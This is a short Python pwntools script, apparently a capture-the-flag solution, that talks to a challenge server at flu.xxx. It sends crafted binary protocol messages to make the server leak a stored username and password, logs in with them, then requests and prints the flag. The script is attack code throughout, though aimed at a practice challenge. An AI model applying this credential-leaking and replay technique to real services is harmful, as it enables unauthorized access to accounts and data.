from pwn import *


io = remote('flu.xxx', 2005)
data = io.recv()
session = data[5:5+0x11-1]
msg_id = b'\x02\x01\x00'
identifier = b'\x11\x02' + session
mem_id = b'\x02\x03\x02'
io.sendline(msg_id + identifier + mem_id)

data = io.recv()
username = data[len(msg_id)+len(session)+5:len(msg_id)+len(session)+10]
password = data[len(msg_id)+len(session)+13:]
msg_id = b'\x02\x01\x01'
login = b'\x02\x04\x01'
io.sendline(msg_id + identifier + login)

data = io.recv()
io.sendline(username)
data = io.recv()
io.sendline(password)
data = io.recv()

msg_id = b'\x02\x01\x02'
flag = b'\x02\x05\x01'
io.sendline(msg_id + identifier + flag)
data = io.recv()
flag = data[data.find(b'flag'):]

print(flag)
